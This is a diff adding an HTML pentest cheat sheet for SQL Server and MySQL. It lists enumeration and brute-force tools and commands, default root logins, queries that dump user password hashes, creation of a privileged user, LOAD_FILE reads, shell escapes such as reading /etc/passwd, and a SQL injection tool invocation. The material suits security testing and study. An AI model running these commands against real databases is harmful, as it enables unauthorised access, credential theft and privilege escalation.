@@ -1,0 +1,139 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SQL</title>
+</head><body>SQL Server Port 1433 1434 open<br/>
+•  SQL Enumeration<ul><li style="list-style-type: none">• piggy </li>
+<li style="list-style-type: none">• SQLPing </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• sqlping ip_address/hostname</li>
+</ul>
+</li>
+<li style="list-style-type: none">• SQLPing2 </li>
+<li style="list-style-type: none">• SQLPing3 </li>
+<li style="list-style-type: none">• SQLpoke </li>
+<li style="list-style-type: none">• SQL Recon </li>
+<li style="list-style-type: none">• SQLver </li>
+</ul>
+•  SQL Brute Force<ul><li style="list-style-type: none">• SQLPAT </li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• sqlbf -u hashes.txt -d dictionary.dic -r out.rep - Dictionary Attack</li>
+<li style="list-style-type: none">• sqlbf -u hashes.txt -c default.cm -r out.rep - Brute-Force Attack</li>
+</ul>
+</li>
+<li style="list-style-type: none">• SQL Dict </li>
+<li style="list-style-type: none">• SQLAT </li>
+<li style="list-style-type: none">• Hydra </li>
+<li style="list-style-type: none">• SQLlhf </li>
+<li style="list-style-type: none">• ForceSQL </li>
+</ul>
+&nbsp;<br/>
+<br/>
+• MySQL port 3306 open<br/>
+• Enumeration<ul><li style="list-style-type: none">• nmap -A -n -p3306 &lt;IP Address&gt;</li>
+<li style="list-style-type: none">• nmap -A -n -PN --script:ALL -p3306 &lt;IP Address&gt;</li>
+<li style="list-style-type: none">• telnet IP_Address 3306</li>
+<li style="list-style-type: none">• use test; select * from test;</li>
+<li style="list-style-type: none">• To check for other DB's -- show databases</li>
+</ul>
+• Administration<ul><li style="list-style-type: none">• MySQL Network Scanner </li>
+<li style="list-style-type: none">• MySQL GUI Tools </li>
+<li style="list-style-type: none">• mysqlshow</li>
+<li style="list-style-type: none">• mysqlbinlog</li>
+</ul>
+• Manual Checks<ul><li style="list-style-type: none">• Default usernames and passwords</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• username: root password:</li>
+</ul>
+</li>
+<li style="list-style-type: none">• testing</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• mysql -h &lt;Hostname&gt; -u root</li>
+<li style="list-style-type: none">• mysql -h &lt;Hostname&gt; -u root</li>
+<li style="list-style-type: none">• mysql -h &lt;Hostname&gt; -u root@localhost</li>
+<li style="list-style-type: none">• mysql -h &lt;Hostname&gt;</li>
+<li style="list-style-type: none">• mysql -h &lt;Hostname&gt; -u ""@localhost</li>
+</ul>
+</li>
+</ul>
+• Configuration Files<ul><li style="list-style-type: none">• Operating System</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• windows</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• config.ini</li>
+<li style="list-style-type: none">• my.ini</li>
+<li style="list-style-type: none">• windows\my.ini</li>
+<li style="list-style-type: none">• winnt\my.ini</li>
+<li style="list-style-type: none">• &lt;InstDir&gt;/mysql/data/</li>
+</ul>
+</li>
+<li style="list-style-type: none">• unix</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• my.cnf</li>
+<li style="list-style-type: none">• /etc/my.cnf</li>
+<li style="list-style-type: none">• /etc/mysql/my.cnf</li>
+<li style="list-style-type: none">• /var/lib/mysql/my.cnf</li>
+<li style="list-style-type: none">• ~/.my.cnf</li>
+<li style="list-style-type: none">• /etc/my.cnf</li>
+</ul>
+</li>
+</ul>
+</li>
+<li style="list-style-type: none">• Command History</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• ~/.mysql.history</li>
+</ul>
+</li>
+<li style="list-style-type: none">• Log Files</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• connections.log</li>
+<li style="list-style-type: none">• update.log</li>
+<li style="list-style-type: none">• common.log</li>
+</ul>
+</li>
+</ul>
+• To run many sql commands at once -- mysql -u username -p &lt; manycommands.sql<br/>
+• MySQL data directory (Location specified in my.cnf)<ul><li style="list-style-type: none">• Parent dir = data directory</li>
+<li style="list-style-type: none">• mysql</li>
+<li style="list-style-type: none">• test</li>
+<li style="list-style-type: none">• information_schema (Key information in MySQL)</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• Complete table list -- select table_schema,table_name from tables;</li>
+<li style="list-style-type: none">• Exact privileges -- select grantee, table_schema, privilege_type FROM schema_privileges;</li>
+<li style="list-style-type: none">• File privileges -- select user,file_priv from mysql.user where user='root';</li>
+<li style="list-style-type: none">• Version -- select version();</li>
+<li style="list-style-type: none">• Load a specific file -- SELECT LOAD_FILE('FILENAME');</li>
+</ul>
+</li>
+</ul>
+SSL Check<ul><li style="list-style-type: none">• mysql&gt; show variables like 'have_openssl';</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• If there's no rows returned at all it means the the distro itself doesn't support SSL connections and probably needs to be recompiled. If its disabled it means that the service just wasn't started with ssl and can be easily fixed.</li>
+</ul>
+</li>
+</ul>
+• Privilege Escalation<ul><li style="list-style-type: none">• Current Level of access</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• mysql&gt;select user();</li>
+<li style="list-style-type: none">• mysql&gt;select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';</li>
+</ul>
+</li>
+<li style="list-style-type: none">• Access passwords</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• mysql&gt; use mysql</li>
+<li style="list-style-type: none">• mysql&gt; select user,password from user;</li>
+</ul>
+</li>
+<li style="list-style-type: none">• Create a new user and grant him privileges</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• mysql&gt;create user test identified by 'test';</li>
+<li style="list-style-type: none">• mysql&gt; grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;</li>
+</ul>
+</li>
+<li style="list-style-type: none">• Break into a shell</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• mysql&gt; \! cat /etc/passwd</li>
+<li style="list-style-type: none">• mysql&gt; \! bash</li>
+</ul>
+</li>
+</ul>
+• SQL injection<ul><li style="list-style-type: none">• mysql-miner.pl </li>
+<li style="list-style-type: none">• mysql-miner.pl http://target/ expected_string database</li>
+<li style="list-style-type: none">• http://www.imperva.com/resources/adc/sql_injection_signatures_evasion.html</li>
+<li style="list-style-type: none">• http://www.justinshattuck.com/2007/01/18/mysql-injection-cheat-sheet/</li>
+</ul>
+• References.<ul><li style="list-style-type: none">• Design Weaknesses</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">• MySQL running as root</li>
+<li style="list-style-type: none">• Exposed publicly on Internet</li>
+</ul>
+</li>
+<li style="list-style-type: none">• http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=mysql</li>
+<li style="list-style-type: none">• http://search.securityfocus.com/swsearch?sbm=%2F&amp;metaname=alldoc&amp;query=mysql&amp;x=0&amp;y=0</li>
+</ul>
+</body></html>
